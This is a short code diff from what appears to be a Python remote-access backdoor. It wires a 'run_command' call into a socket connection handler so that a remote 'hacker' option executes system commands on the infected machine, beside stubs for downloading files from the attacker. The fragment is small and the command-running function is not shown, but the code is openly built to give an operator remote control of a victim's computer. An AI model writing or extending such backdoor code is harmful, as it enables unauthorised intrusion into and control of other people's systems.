@@ -1,4 +1,4 @@
-
+from core.features.command import run_command
 
 def handleConnection(my_socket):
     print("[+] Handling Connection")
@@ -8,6 +8,7 @@ def handleConnection(my_socket):
         print("[+] hacker selected option = ", user_option)
         if user_option == "1":
             print("\t\t[+] Executing System Commands")
+            run_command(my_socket)
         elif user_option == "2":
             print("\t\t[+] Downloading Files from hacker")
         elif user_option == "3":
